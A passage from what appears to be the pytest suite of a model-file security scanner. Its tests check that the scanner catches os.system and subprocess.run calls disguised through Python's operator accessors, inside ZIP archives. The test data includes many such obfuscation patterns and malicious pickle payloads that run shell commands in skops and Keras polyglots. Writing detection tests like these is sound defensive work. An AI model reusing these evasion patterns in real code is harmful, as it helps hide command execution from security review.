            b"import operator, os\noperator.attrgetter('getcwd', 'system')(os)[-1]('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\nrun, _ = operator.attrgetter('system', 'getcwd')(os)\nrun('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.itemgetter('run')({'run': os.system})('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.itemgetter(-1)([print, os.system])('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.itemgetter(True)({1: os.system})('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.itemgetter(1.0)({1: os.system})('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.itemgetter(None)({None: os.system})('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\noperator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\noperator.methodcaller('get', 'run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\nif flag:\n    payload = {'run': print}\nelse:\n    payload = {}\n"
            b"operator.methodcaller('get', 'run', os.system)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\nif flag:\n    payload = {'run': os.system}\nelse:\n    payload = {}\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.methodcaller('__getitem__', 'run')({'run': os.system})('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.methodcaller('get', '_missing_', os.system)(os.__dict__)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.methodcaller('get', None, os.system)({})('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.methodcaller('pop', '_missing_', os.system)(os.__dict__)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.methodcaller('setdefault', '_missing_', os.system)(os.__dict__)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.attrgetter('__dict__')(os)['system']('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.methodcaller('__getattribute__', '__dict__')(os)['system']('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.methodcaller('__getattribute__', 'system')(os)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"from operator import methodcaller\nimport subprocess\nmethodcaller('run', ['id'])(subprocess)\n",
            "S103",
            "subprocess.run",
        ),
        (
            b"import operator, os\npair = operator.attrgetter('getcwd', 'system')(os)\npair[1]('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npair = operator.itemgetter('safe', 'run')"
            b"({'safe': print, 'run': os.system})\npair[-1]('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\npayload['run'] = os.system\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\npayload.update({'run': os.system})\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\ndict.update(payload, {'run': os.system})\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\npayload.__setitem__('run', os.system)\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\npayload.setdefault('run', os.system)\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\npayload |= {'run': os.system}\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {'run': print}\n"
            b"writer = operator.methodcaller('__setitem__', 'run', os.system)\nwriter(payload)\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\n"
            b"writer = operator.methodcaller('update', {'run': os.system})\nwriter(payload)\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = [print]\n"
            b"writer = operator.methodcaller('append', os.system)\nwriter(payload)\n"
            b"operator.itemgetter(-1)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = [print, os.system]\npayload.pop(0)\n"
            b"operator.itemgetter(0)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = [print, os.system]\ndel payload[0]\n"
            b"operator.itemgetter(0)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = [print, os.system]\npayload.insert(0, print)\n"
            b"operator.itemgetter(2)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\npayload[dynamic_key] = os.system\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\ndel os.getcwd\n"
            b"operator.methodcaller('get', 'getcwd', os.system)(os.__dict__)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = [print]\npayload += [os.system]\noperator.itemgetter(-1)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = [os.system]\npayload *= 2\noperator.itemgetter(1)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\n"
            b"writer = operator.methodcaller('update', run=os.system)\nwriter(payload)\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {}\n"
            b"writer = operator.methodcaller('update', {**{'run': print}, 'run': os.system})\n"
            b"writer(payload)\noperator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\nupdates = {'run': os.system}\npayload = {}\n"
            b"writer = operator.methodcaller('update', **updates)\nwriter(payload)\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\nupdates = {'run': os.system}\npayload = {}\npayload.update(**updates)\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = {**{'run': os.system}}\noperator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (b"import operator, os\noperator.itemgetter(b'run')({b'run': os.system})('id')\n", "S101", "os.system"),
        (b"import operator, os\noperator.itemgetter(1 + 2j)({1 + 2j: os.system})('id')\n", "S101", "os.system"),
        (b"import operator, os\noperator.itemgetter(...)({...: os.system})('id')\n", "S101", "os.system"),
        (
            b"import operator, os\noperator.itemgetter(('run', 1))({('run', 1): os.system})('id')\n",
            "S101",
            "os.system",
        ),
        (b"import operator, os\noperator.itemgetter(+True)({1: os.system})('id')\n", "S101", "os.system"),
        (
            b"import operator, os\npayload = {}\nalias = payload\nalias['run'] = os.system\n"
            b"operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\npayload = (print,)\nalias = payload\npayload += (os.system,)\n"
            b"operator.itemgetter(-1)(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\nwriter = operator.methodcaller('__setitem__', 'runner', os.system)\n"
            b"writer(os.__dict__)\nos.__dict__['runner']('id')\n",
            "S101",
            "os.system",
        ),
        (b"import operator, os\noperator.attrgetter('system', **{})(os)('id')\n", "S101", "os.system"),
        (b"import operator, os\noperator.itemgetter('system')(os.__dict__, **{})('id')\n", "S101", "os.system"),
    ],
)
def test_high_risk_python_calls_resolves_operator_accessor_execution(
    source: bytes, expected_rule_code: str, expected_call: str
) -> None:
    calls = high_risk_python_calls_in_source(source)

    assert any(call.rule_code == expected_rule_code and call.name == expected_call for call in calls)


@pytest.mark.parametrize(
    "source",
    [
        b"import operator, os\noperator.attrgetter('getcwd')(os)()\n",
        b"import operator\noperator.methodcaller('lower')('SAFE')\n",
        b"import operator, subprocess\noperator.methodcaller('get', 'not_risky')(subprocess.__dict__)\n",
        b"import operator, os\noperator.methodcaller('system.__call__', 'id')(os)\n",
        b"import operator, os\noperator.methodcaller('__getattr__', 'system')(os)\n",
        b"import operator, os\noperator.itemgetter(None)({None: print})('safe')\n",
        b"import operator, os\noperator.methodcaller('get', None, print)({})('safe')\n",
        b"import operator, os\noperator.methodcaller('__getattribute__', '__dict__')(os)['getcwd']()\n",
        b"import operator, os\noperator.attrgetter('system', 'getcwd')(os)\n",
        b"import operator, os\noperator.attrgetter('system', 'getcwd')(os)[1]()\n",
        b"import operator, os\npair = operator.attrgetter('getcwd', 'system')(os)\npair[0]()\n",
        (
            b"import operator, os\npair = operator.itemgetter('safe', 'run')"
            b"({'safe': print, 'run': os.system})\npair[0]('safe')\n"
        ),
        b"import operator, os\noperator.methodcaller('get', 'safe', os.system)({'safe': lambda: None})()\n",
        (
            b"import operator, os\npayload = {'run': os.system}\npayload['run'] = print\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\npayload.update({'run': print})\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\ndict.update(payload, {'run': print})\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\npayload.__setitem__('run', print)\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': print}\npayload.setdefault('run', os.system)\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\npayload |= {'run': print}\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\n"
            b"writer = operator.methodcaller('__setitem__', 'run', print)\nwriter(payload)\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\n"
            b"writer = operator.methodcaller('update', {'run': print})\nwriter(payload)\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = [os.system]\n"
            b"writer = operator.methodcaller('append', print)\nwriter(payload)\n"
            b"operator.itemgetter(-1)(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\ndel payload['run']\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\npayload.clear()\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {'run': os.system}\npayload.pop('run')\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = [os.system, print]\npayload.pop(0)\n"
            b"operator.itemgetter(0)(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = {}\npayload[dynamic_key] = print\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        b"import operator, os\noperator.methodcaller('get', 'getcwd', os.system)(os.__dict__)()\n",
        (
            b"import operator, os\npayload = {'run': os.system}\nalias = payload\nalias['run'] = print\n"
            b"operator.itemgetter('run')(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = [os.system]\nalias = payload\nalias[0] = print\n"
            b"operator.itemgetter(0)(payload)('safe')\n"
        ),
        (
            b"import operator, os\npayload = (print,)\nalias = payload\npayload += (os.system,)\n"
            b"operator.itemgetter(-1)(alias)('safe')\n"
        ),
        (
            b"import operator, os\npayload = (print,)\n"
            b"writer = operator.methodcaller('append', os.system)\nwriter(payload)\n"
            b"operator.itemgetter(-1)(payload)('safe')\n"
        ),
        (
            b"import operator, os\nleft = {}\nright = {}\nleft['run'] = os.system\n"
            b"operator.itemgetter('run')(right)('safe')\n"
        ),
        b"import operator, os\noperator.itemgetter('run')({**[('run', os.system)]})('id')\n",
        (
            b"import operator, os\nupdates = {1: os.system}\n"
            b"writer = operator.methodcaller('update', **updates)\npayload = {}\nwriter(payload)\n"
            b"operator.itemgetter(1)(payload)('safe')\n"
        ),
        (
            b"import operator, os\nwriter = operator.methodcaller('update', run=print, **{'run': os.system})\n"
            b"payload = {}\nwriter(payload)\noperator.itemgetter('run')(payload)('safe')\n"
        ),
        b"import operator, os\noperator.methodcaller('get', 'run', extra=1)({'run': os.system})('id')\n",
        b"import operator, os\noperator.methodcaller('__getitem__', 'run', 1)({'run': os.system})('id')\n",
        (
            b"import operator, os\npayload = {}\n"
            b"writer = operator.methodcaller('update', {**{'run': os.system}, 'run': print})\n"
            b"writer(payload)\noperator.itemgetter('run')(payload)('safe')\n"
        ),
    ],
)
def test_high_risk_python_calls_ignores_benign_operator_accessor_names(source: bytes) -> None:
    calls = high_risk_python_calls_in_source(source)

    assert not calls


@pytest.mark.parametrize(
    ("source", "expected_rule_code", "expected_call"),
    [
        (
            "import operator\nimport os\noperator.attrgetter('system')(os)('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\noperator.attrgetter('system.__call__')(os)('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\noperator.itemgetter('system')(os.__dict__)('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\noperator.attrgetter('getcwd', 'system')(os)[1]('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\noperator.itemgetter('run')({'run': os.system})('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\npayload = {'run': os.system}\noperator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\noperator.methodcaller('get', '_missing_', os.system)(os.__dict__)('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\noperator.attrgetter('__dict__')(os)['system']('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\noperator.methodcaller('__getattribute__', '__dict__')(os)['system']('id')\n",
            "S101",
            "os.system",
        ),
        (
            "import operator\nimport os\npayload = {}\npayload.update({'run': os.system})\n"
            "operator.itemgetter('run')(payload)('id')\n",
            "S101",
            "os.system",
        ),
        (
            "from operator import attrgetter\n"
            "import subprocess\n"
            "runner = attrgetter('run')(subprocess)\n"
            "runner(['id'], check=False)\n",
            "S103",
            "subprocess.run",
        ),
        (
            "import operator\nimport os\noperator.methodcaller('system', 'id')(os)\n",
            "S101",
            "os.system",
        ),
        (
            "from operator import methodcaller\n"
            "import subprocess\n"
            "methodcaller('run', ['id'], check=False)(subprocess)\n",
            "S103",
            "subprocess.run",
        ),
        (
            "from operator import methodcaller\nimport os\nmethodcaller('__getattribute__', 'system')(os)('id')\n",
            "S101",
            "os.system",
        ),
    ],
)
def test_scan_zip_python_member_detects_operator_accessor_execution(
    tmp_path: Path, source: str, expected_rule_code: str, expected_call: str
) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert any(
        check.rule_code == expected_rule_code and expected_call in check.details["reason"] for check in python_checks
    )


@pytest.mark.parametrize(
    "source",
    [
        "import operator\nimport os\noperator.attrgetter('getcwd')(os)()\n",
        ("from operator import attrgetter\nclass Safe:\n    system = 'label'\nvalue = attrgetter('system')(Safe())\n"),
        "import operator\noperator.methodcaller('lower')('SAFE')\n",
        "from operator import methodcaller\nimport os\nmethodcaller('getcwd')(os)\n",
        "import operator\nimport subprocess\noperator.methodcaller('get', 'not_risky')(subprocess.__dict__)\n",
        "import operator\nimport os\noperator.methodcaller('system.__call__', 'id')(os)\n",
        "import operator\nimport os\noperator.methodcaller('__getattr__', 'system')(os)\n",
        ("import operator\nimport os\noperator.methodcaller('__getattribute__', '__dict__')(os)['getcwd']()\n"),
        "import operator\nimport os\noperator.attrgetter('system', 'getcwd')(os)\n",
        ("import operator\nimport os\noperator.methodcaller('get', 'safe', os.system)({'safe': lambda: None})()\n"),
        (
            "import operator\nimport os\npayload = {'run': os.system}\npayload.update({'run': print})\n"
            "operator.itemgetter('run')(payload)('safe')\n"
        ),
    ],
)
def test_scan_zip_python_member_ignores_benign_operator_accessor_names(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_python_member_emits_separate_check_per_rule_code(tmp_path: Path) -> None:
    """Mixed-risk source should yield one finding per rule code, sorted by code."""
    archive_path = tmp_path / "source_bundle.zip"
    source = "import os\nimport subprocess\nos.system('echo a')\nsubprocess.run(['echo', 'b'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    rule_codes = [check.rule_code for check in python_checks]
    assert rule_codes == ["S101", "S103"]
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"
    assert python_checks[1].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_honors_max_mar_python_analysis_bytes_config(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Generic ZIP Python analysis stays focused on Python-source coverage."""
    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
    archive_path = tmp_path / "source_bundle.zip"
    # ~60 KB payload; a 1 KB configured cap must cause the scanner to mark this
    # member analysis incomplete instead of silently reading the whole thing.
    source = "import os\nos.system('echo hidden')\n" + ("# pad\n" * 10_000)
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner({"max_mar_python_analysis_bytes": 1024}).scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    details = python_checks[0].details
    assert details["analysis_incomplete"] is True
    assert details["max_scan_bytes"] == 1024
    assert details["file_size"] >= 60_000
    reasons = result.metadata["scan_outcome_reasons"]
    assert "zip_python_member_analysis_incomplete" in reasons
    assert "onnx_tentative_candidate_analysis_unavailable" not in reasons


def test_scan_zip_python_member_honors_pep263_encoding_declaration(tmp_path: Path) -> None:
    """PEP 263 encoding declarations must be honored when parsing member sources."""
    archive_path = tmp_path / "source_bundle.zip"
    # Comment contains a non-UTF-8 byte (\xe9 in latin-1 = 'é'); utf-8 replace
    # would mangle it and could produce a SyntaxError. Passing bytes to
    # ast.parse directly lets Python honor the coding declaration.
    source = b"# -*- coding: latin-1 -*-\n# comment \xe9\nimport os\nos.system('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


class _HeaderRoutedTempScanner(BaseScanner):
    name: ClassVar[str] = "header_routed_temp"

    @classmethod
    def can_handle(cls, path: str) -> bool:
        return False

    def scan(self, path: str) -> ScanResult:
        result = ScanResult(scanner_name=self.name, scanner=self)
        result.add_check(
            name="Header-routed temp scan",
            passed=True,
            message=f"Scanned {path}",
            location=path,
        )
        result.finish(success=True)
        return result


class _HeaderRoutedFindingScanner(_HeaderRoutedTempScanner):
    name: ClassVar[str] = "header_routed_finding"

    def scan(self, path: str) -> ScanResult:
        result = ScanResult(scanner_name=self.name, scanner=self)
        result.add_check(
            name="Header-routed temp scan",
            passed=False,
            message=f"Detected header-routed payload in {path}",
            severity=IssueSeverity.WARNING,
            location=path,
        )
        result.finish(success=False)
        return result


def test_scan_nested_file_honors_header_route_when_temp_suffix_is_rejected(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"header-routed model payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )

    def load_scanner_by_id(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "header_only_scanner":
            return _HeaderRoutedTempScanner
        return None

    def get_scanner_for_path(path: str) -> type[BaseScanner] | None:
        raise AssertionError(f"header-routed nested member fell back to path routing: {path}")

    monkeypatch.setattr(_registry, "load_scanner_by_id", load_scanner_by_id)
    monkeypatch.setattr(_registry, "get_scanner_for_path", get_scanner_for_path)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "header_routed_temp"
    assert result.success is True


def test_scan_nested_file_drops_header_route_when_rechecked_header_mismatches(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"not actually a header-routed payload")
    detected_formats = iter(["header_only_model", "unknown"])

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: next(detected_formats))
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: _HeaderRoutedTempScanner)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is True


def test_scan_nested_file_header_routed_generic_suffix_can_report_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"header-routed malicious payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: _HeaderRoutedFindingScanner)

    def get_scanner_for_path(path: str) -> type[BaseScanner] | None:
        raise AssertionError(f"header-routed nested member fell back to path routing: {path}")

    monkeypatch.setattr(_registry, "get_scanner_for_path", get_scanner_for_path)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "header_routed_finding"
    assert result.success is False
    failed_checks = [check for check in result.checks if check.status == CheckStatus.FAILED]
    assert len(failed_checks) == 1
    assert failed_checks[0].severity == IssueSeverity.WARNING
    assert "detected header-routed payload" in failed_checks[0].message.lower()
    assert result.has_warnings is True
    assert result.has_errors is False


def test_scan_nested_file_fails_closed_when_recognized_header_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"header-routed model payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setattr(archive_dispatch, "detect_file_format_from_magic", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]

    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.severity == IssueSeverity.INFO
    assert "Recognized format could not be scanned" in check.message
    assert check.details["format"] == "header_only_model"
    assert check.details["preferred_scanner_id"] == "header_only_scanner"


def test_executable_zip_composed_routing_fails_closed_when_subtype_scanner_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "skops-polyglot.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(
            "schema.json",
            json.dumps(
                {
                    "__loader__": "OperatorFuncNode",
                    "__module__": "builtins",
                    "__class__": "eval",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ),
        )
        archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

    original_loader = _registry.load_scanner_by_id

    def load_scanner_by_id(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "skops":
            return None
        return original_loader(scanner_id)

    monkeypatch.setattr(_registry, "load_scanner_by_id", load_scanner_by_id)

    result = ScanResult(scanner_name="zip")
    archive_dispatch.merge_executable_zip_container_findings(
        str(archive_path),
        result,
        {"cache_enabled": False},
        context="test executable ZIP polyglot",
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]

    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.status == CheckStatus.FAILED
    assert check.severity == IssueSeverity.INFO
    assert check.details["format"] == "skops"
    assert check.details["preferred_scanner_id"] == "skops"
    assert any(
        issue.rule_code == "S201"
        and issue.details.get("zip_entry") == "payload.pkl"
        and issue.severity == IssueSeverity.CRITICAL
        for issue in result.issues
    )


def test_executable_zip_unavailable_subtype_fails_closed_and_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "skops-polyglot.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(
            "schema.json",
            json.dumps(
                {
                    "__loader__": "ObjectNode",
                    "__module__": "sklearn.pipeline",
                    "__class__": "Pipeline",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ),
        )
    archive_path.write_bytes(b"\x7fELF" + b"\x00" * 60 + archive_path.read_bytes())

    original_loader = _registry.load_scanner_by_id

    def load_scanner_by_id(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "skops":
            return None
        return original_loader(scanner_id)

    monkeypatch.setattr(_registry, "load_scanner_by_id", load_scanner_by_id)

    _assert_inconclusive_zip_aggregate_not_cached(
        archive_path,
        "recognized_format_scanner_unavailable",
        tmp_path / "cache",
    )


def test_executable_zip_unavailable_subtype_ignores_benign_schema_near_match(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "generic-polyglot.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(
            "schema.json",
            json.dumps(
                {
                    "__loader__": "ObjectNode",
                    "__module__": "sklearn.pipeline",
                    "__class__": "Pipeline",
                    "content": {},
                }
            ),
        )

    original_loader = _registry.load_scanner_by_id

    def load_scanner_by_id(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "skops":
            raise AssertionError("benign schema near-match routed to the Skops scanner")
        return original_loader(scanner_id)

    monkeypatch.setattr(_registry, "load_scanner_by_id", load_scanner_by_id)

    result = ScanResult(scanner_name="zip")
    archive_dispatch.merge_executable_zip_container_findings(
        str(archive_path),
        result,
        {"cache_enabled": False},
        context="test executable ZIP polyglot",
    )

    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert all(check.name != "Format Detection" for check in result.checks)


def test_scan_nested_file_does_not_fail_closed_for_extension_only_member(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "metadata.pb"
    extracted_member.write_bytes(b"plain protobuf-ish bytes")

    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert not any(check.name == "Format Detection" for check in result.checks)


@pytest.mark.parametrize("malicious", [False, True])
def test_scan_nested_file_fails_closed_and_preserves_generic_keras_zip_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    malicious: bool,
) -> None:
    nested_keras = tmp_path / "nested.keras"
    with zipfile.ZipFile(nested_keras, "w") as archive:
        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
        if malicious:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

    original_load_scanner = _registry._load_scanner

    def load_scanner_by_id(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(_registry, "_load_scanner", load_scanner_by_id)

    result = scan_nested_file(str(nested_keras), {"cache_enabled": False})

    assert result.scanner_name == "zip"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    security_findings = [
